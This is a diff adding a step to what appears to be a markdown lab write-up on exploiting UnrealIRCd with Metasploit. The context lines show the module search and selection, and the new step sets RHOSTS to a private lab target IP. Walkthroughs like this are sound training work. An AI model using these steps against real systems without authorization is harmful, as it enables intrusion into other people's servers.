@@ -43,3 +43,12 @@ search unrealircd
 use 0
 ```
 ![MetaSploit Search Results](metasploit-search.png)
+
+Step 2: Configure Target Options
+
+Next, I configured the target's IP address (RHOSTS) to point to the lab machine.
+```bash
+set RHOSTS 10.112.189.250 (Target IP)
+```
+![Setting RHOST](MetaSpolit-settinghost.png)
+
